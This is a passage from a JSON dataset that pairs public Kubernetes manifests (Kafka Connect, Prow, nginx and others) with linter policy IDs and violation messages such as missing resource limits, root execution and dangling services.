CONNECT_STATUS_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_VALUE_CONVERTER\n          value: io.confluent.connect.avro.AvroConverter\n        - name: CONNECT_VALUE_CONVERTER_SCHEMAS_ENABLE\n          value: 'false'\n        - name: KAFKA_JMX_PORT\n          value: '5555'\n        image: confluentinc/cp-kafka-connect:5.5.0\n        imagePullPolicy: IfNotPresent\n        name: cp-kafka-connect-server\n        ports:\n        - containerPort: 8083\n          name: kafka-connect\n          protocol: TCP\n        - containerPort: 5555\n          name: jmx\n          protocol: TCP\n        resources: {}\n      securityContext: {}\n      volumes:\n      - configMap:\n          defaultMode: 420\n          name: think-confluent-cp-kafka-connect-jmx-configmap\n        name: jmx-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cp-kafka-connect-server\" has memory limit 0"
  },
  {
    "id": "9334",
    "manifest_path": "data/manifests/the_stack_sample/sample_3532.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    deployment.kubernetes.io/revision: '1'\n    meta.helm.sh/release-name: think-confluent\n    meta.helm.sh/release-namespace: kafka\n  labels:\n    app: cp-kafka-connect\n    app.kubernetes.io/managed-by: Helm\n    chart: cp-kafka-connect-0.1.0\n    heritage: Helm\n    release: think-confluent\n  name: think-confluent-cp-kafka-connect\n  namespace: kafka\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cp-kafka-connect\n      release: think-confluent\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '5556'\n        prometheus.io/scrape: 'true'\n      labels:\n        app: cp-kafka-connect\n        release: think-confluent\n    spec:\n      containers:\n      - command:\n        - java\n        - -XX:+UnlockExperimentalVMOptions\n        - -XX:+UseCGroupMemoryLimitForHeap\n        - -XX:MaxRAMFraction=1\n        - -XshowSettings:vm\n        - -jar\n        - jmx_prometheus_httpserver.jar\n        - '5556'\n        - /etc/jmx-kafka-connect/jmx-kafka-connect-prometheus.yml\n        image: solsson/kafka-prometheus-jmx-exporter@sha256:6f82e2b0464f50da8104acd7363fb9b995001ddff77d248379f8788e78946143\n        imagePullPolicy: IfNotPresent\n        name: prometheus-jmx-exporter\n        ports:\n        - containerPort: 5556\n          protocol: TCP\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/jmx-kafka-connect\n          name: jmx-config\n      - env:\n        - name: CONNECT_REST_ADVERTISED_HOST_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: CONNECT_BOOTSTRAP_SERVERS\n          value: PLAINTEXT://think-confluent-cp-kafka-headless:9092\n        - name: CONNECT_GROUP_ID\n          value: think-confluent\n        - name: CONNECT_CONFIG_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-config\n        - name: CONNECT_OFFSET_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-offset\n        - name: CONNECT_STATUS_STORAGE_TOPIC\n          value: think-confluent-cp-kafka-connect-status\n        - name: CONNECT_KEY_CONVERTER_SCHEMA_REGISTRY_URL\n          value: http://think-confluent-cp-schema-registry:8081\n        - name: CONNECT_VALUE_CONVERTER_SCHEMA_REGISTRY_URL\n          value: http://think-confluent-cp-schema-registry:8081\n        - name: KAFKA_HEAP_OPTS\n          value: -Xms512M -Xmx512M\n        - name: CONNECT_CONFIG_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_INTERNAL_KEY_CONVERTER\n          value: org.apache.kafka.connect.json.JsonConverter\n        - name: CONNECT_INTERNAL_VALUE_CONVERTER\n          value: org.apache.kafka.connect.json.JsonConverter\n        - name: CONNECT_KEY_CONVERTER\n          value: io.confluent.connect.avro.AvroConverter\n        - name: CONNECT_KEY_CONVERTER_SCHEMAS_ENABLE\n          value: 'false'\n        - name: CONNECT_OFFSET_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_PLUGIN_PATH\n          value: /usr/share/java,/usr/share/confluent-hub-components\n        - name: CONNECT_STATUS_STORAGE_REPLICATION_FACTOR\n          value: '3'\n        - name: CONNECT_VALUE_CONVERTER\n          value: io.confluent.connect.avro.AvroConverter\n        - name: CONNECT_VALUE_CONVERTER_SCHEMAS_ENABLE\n          value: 'false'\n        - name: KAFKA_JMX_PORT\n          value: '5555'\n        image: confluentinc/cp-kafka-connect:5.5.0\n        imagePullPolicy: IfNotPresent\n        name: cp-kafka-connect-server\n        ports:\n        - containerPort: 8083\n          name: kafka-connect\n          protocol: TCP\n        - containerPort: 5555\n          name: jmx\n          protocol: TCP\n        resources: {}\n      securityContext: {}\n      volumes:\n      - configMap:\n          defaultMode: 420\n          name: think-confluent-cp-kafka-connect-jmx-configmap\n        name: jmx-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"prometheus-jmx-exporter\" has memory limit 0"
  },
  {
    "id": "9335",
    "manifest_path": "data/manifests/the_stack_sample/sample_3533.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: '{{ template \"gatekeeper.name\" . }}'\n    chart: '{{ template \"gatekeeper.name\" . }}'\n    gatekeeper.sh/system: 'yes'\n    heritage: '{{ .Release.Service }}'\n    release: '{{ .Release.Name }}'\n  name: gatekeeper-webhook-service\nspec:\n  ports:\n  - port: 443\n    targetPort: 8443\n    name: gatekeeper-https\n  selector:\n    app: '{{ template \"gatekeeper.name\" . }}'\n    chart: '{{ template \"gatekeeper.name\" . }}'\n    control-plane: controller-manager\n    gatekeeper.sh/operation: webhook\n    gatekeeper.sh/system: 'yes'\n    heritage: '{{ .Release.Service }}'\n    release: '{{ .Release.Name }}'\n",
    "policy_id": "dangling-service",
    "violation_text": "service has invalid label selector: values[0][app]: Invalid value: \"{{ template \\\"gatekeeper.name\\\" . }}\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')"
  },
  {
    "id": "9336",
    "manifest_path": "data/manifests/the_stack_sample/sample_3534.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-snapshot-controller\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: csi-snapshot-controller\n  template:\n    metadata:\n      labels:\n        app: csi-snapshot-controller\n    spec:\n      serviceAccountName: csi-snapshot-controller-sa\n      containers:\n      - name: csi-snapshot-controller\n        image: mcr.microsoft.com/oss/kubernetes-csi/snapshot-controller:v2.0.0\n        args:\n        - --v=5\n        - -leader-election\n        imagePullPolicy: Always\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 1000Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-snapshot-controller\" does not have a read-only root file system"
  },
  {
    "id": "9337",
    "manifest_path": "data/manifests/the_stack_sample/sample_3534.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-snapshot-controller\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: csi-snapshot-controller\n  template:\n    metadata:\n      labels:\n        app: csi-snapshot-controller\n    spec:\n      serviceAccountName: csi-snapshot-controller-sa\n      containers:\n      - name: csi-snapshot-controller\n        image: mcr.microsoft.com/oss/kubernetes-csi/snapshot-controller:v2.0.0\n        args:\n        - --v=5\n        - -leader-election\n        imagePullPolicy: Always\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 1000Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"csi-snapshot-controller-sa\" not found"
  },
  {
    "id": "9338",
    "manifest_path": "data/manifests/the_stack_sample/sample_3534.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-snapshot-controller\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: csi-snapshot-controller\n  template:\n    metadata:\n      labels:\n        app: csi-snapshot-controller\n    spec:\n      serviceAccountName: csi-snapshot-controller-sa\n      containers:\n      - name: csi-snapshot-controller\n        image: mcr.microsoft.com/oss/kubernetes-csi/snapshot-controller:v2.0.0\n        args:\n        - --v=5\n        - -leader-election\n        imagePullPolicy: Always\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 1000Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"csi-snapshot-controller\" is not set to runAsNonRoot"
  },
  {
    "id": "9339",
    "manifest_path": "data/manifests/the_stack_sample/sample_3537.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-nginx-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: my-nginx\n  template:\n    metadata:\n      name: my-nginx-pod\n      labels:\n        app: my-nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.10\n        ports:\n        - containerPort: 80\n          protocol: TCP\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9340",
    "manifest_path": "data/manifests/the_stack_sample/sample_3537.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-nginx-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: my-nginx\n  template:\n    metadata:\n      name: my-nginx-pod\n      labels:\n        app: my-nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.10\n        ports:\n        - containerPort: 80\n          protocol: TCP\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "9341",
    "manifest_path": "data/manifests/the_stack_sample/sample_3537.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-nginx-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: my-nginx\n  template:\n    metadata:\n      name: my-nginx-pod\n      labels:\n        app: my-nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.10\n        ports:\n        - containerPort: 80\n          protocol: TCP\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "9342",
    "manifest_path": "data/manifests/the_stack_sample/sample_3537.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-nginx-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: my-nginx\n  template:\n    metadata:\n      name: my-nginx-pod\n      labels:\n        app: my-nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.10\n        ports:\n        - containerPort: 80\n          protocol: TCP\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "9343",
    "manifest_path": "data/manifests/the_stack_sample/sample_3537.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-nginx-deployment\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: my-nginx\n  template:\n    metadata:\n      name: my-nginx-pod\n      labels:\n        app: my-nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.10\n        ports:\n        - containerPort: 80\n          protocol: TCP\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "9344",
    "manifest_path": "data/manifests/the_stack_sample/sample_3539.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: elastic-helper\n  labels:\n    app: assemblyline\n    section: core\n    component: elastic-helper\nspec:\n  clusterIP: None\n  selector:\n    app: assemblyline\n    section: core\n    component: elastic-helper\n  ports:\n  - protocol: TCP\n    port: 8000\n    targetPort: 8000\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:assemblyline component:elastic-helper section:core])"
  },
  {
    "id": "9345",
    "manifest_path": "data/manifests/the_stack_sample/sample_3541.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: katib\n    app.kubernetes.io/component: katib\n    app.kubernetes.io/name: katib-controller\n    component: db-manager\n  name: katib-db-manager\n  namespace: kubeflow\nspec:\n  ports:\n  - name: api\n    port: 6789\n    protocol: TCP\n  selector:\n    app: katib\n    app.kubernetes.io/component: katib\n    app.kubernetes.io/name: katib-controller\n    component: db-manager\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:katib app.kubernetes.io/component:katib app.kubernetes.io/name:katib-controller component:db-manager])"
  },
  {
    "id": "9346",
    "manifest_path": "data/manifests/the_stack_sample/sample_3544.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20200520-e1124f454\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"horologium\" does not have a read-only root file system"
  },
  {
    "id": "9347",
    "manifest_path": "data/manifests/the_stack_sample/sample_3544.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20200520-e1124f454\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"horologium\" not found"
  },
  {
    "id": "9348",
    "manifest_path": "data/manifests/the_stack_sample/sample_3544.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20200520-e1124f454\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"horologium\" is not set to runAsNonRoot"
  },
  {
    "id": "9349",
    "manifest_path": "data/manifests/the_stack_sample/sample_3544.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20200520-e1124f454\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"horologium\" has cpu request 0"
  },
  {
    "id": "9350",
    "manifest_path": "data/manifests/the_stack_sample/sample_3544.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20200520-e1124f454\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"horologium\" has memory limit 0"
  },
  {
    "id": "9351",
    "manifest_path": "data/manifests/the_stack_sample/sample_3545.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: crawler-google-ads-postgres\n  labels:\n    type: db\n    db: crawler-google-ads-postgres\nspec:\n  type: ClusterIP\n  ports:\n  - port: 5432\n    targetPort: 5432\n  selector:\n    type: db\n    db: crawler-google-ads-postgres\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[db:crawler-google-ads-postgres type:db])"
  },
  {
    "id": "9352",
    "manifest_path": "data/manifests/the_stack_sample/sample_3547.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: fullfillorder\n  annotations:\n    service.beta.kubernetes.io/azure-load-balancer-internal: 'true'\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 8080\n    targetPort: 8080\n  selector:\n    app: fullfillorder\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:fullfillorder])"
  },
  {
    "id": "9353",
    "manifest_path": "data/manifests/the_stack_sample/sample_3548.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: recommendation\nspec:\n  selector:\n    matchLabels:\n      app: recommendation\n  template:\n    metadata:\n      labels:\n        app: recommendation\n        version: v2\n    spec:\n      containers:\n      - name: rec\n        image: hands-on/recommendation-service:v2\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: docker,prod\n        resources:\n          requests:\n            memory: 200Mi\n          limits:\n            memory: 400Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"rec\" does not have a read-only root file system"
  },
  {
    "id": "9354",
    "manifest_path": "data/manifests/the_stack_sample/sample_3548.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: recommendation\nspec:\n  selector:\n    matchLabels:\n      app: recommendation\n  template:\n    metadata:\n      labels:\n        app: recommendation\n        version: v2\n    spec:\n      containers:\n      - name: rec\n        image: hands-on/recommendation-service:v2\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: docker,prod\n        resources:\n          requests:\n            memory: 200Mi\n          limits:\n            memory: 400Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"rec\" is not set to runAsNonRoot"
  },
  {
    "id": "9355",
    "manifest_path": "data/manifests/the_stack_sample/sample_3548.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: recommendation\nspec:\n  selector:\n    matchLabels:\n      app: recommendation\n  template:\n    metadata:\n      labels:\n        app: recommendation\n        version: v2\n    spec:\n      containers:\n      - name: rec\n        image: hands-on/recommendation-service:v2\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: docker,prod\n        resources:\n          requests:\n            memory: 200Mi\n          limits:\n            memory: 400Mi\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"rec\" has cpu request 0"
  },
  {
    "id": "9356",
    "manifest_path": "data/manifests/the_stack_sample/sample_3549.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20191112-9f0441013\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"deck\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "9357",
    "manifest_path": "data/manifests/the_stack_sample/sample_3549.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20191112-9f0441013\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9358",
    "manifest_path": "data/manifests/the_stack_sample/sample_3549.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20191112-9f0441013\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"deck\" does not have a read-only root file system"
  },
  {
    "id": "9359",
    "manifest_path": "data/manifests/the_stack_sample/sample_3549.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: deck\n  labels:\n    app: deck\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: deck\n  template:\n    metadata:\n      labels:\n        app: deck\n    spec:\n      containers:\n      - name: deck\n        image: gcr.io/k8s-prow/deck:v20191112-9f0441013\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 8080\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --tide-url=http://tide/\n        - --hook-url=http://hook:8888/plugin-help\n        - --redirect-http-to=prow.k8s.io\n        - --oauth-url=/github-login\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --spyglass=true\n        - --rerun-creates-job\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-oauth-config-file=/etc/githuboauth/secret\n        - --cookie-secret=/etc/cookie/secret\n        - --plugin-config=/etc/plugins/plugins.yaml\n        volumeMounts:\n        - name: oauth-config\n          mountPath: /etc/githuboauth\n          readOnly: true\n        - name: cookie-secret\n          mountPath: /etc/cookie\n          readOnly: true\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: oauth-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: oauth-config\n        secret:\n          secretName: github-oauth-config\n      - name: oauth-token\n        secret:\n          secretName: oauth-token\n      - name: cookie-secret\n        secret:\n          secretName: cookie\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: config\n        configMap:\n          name: 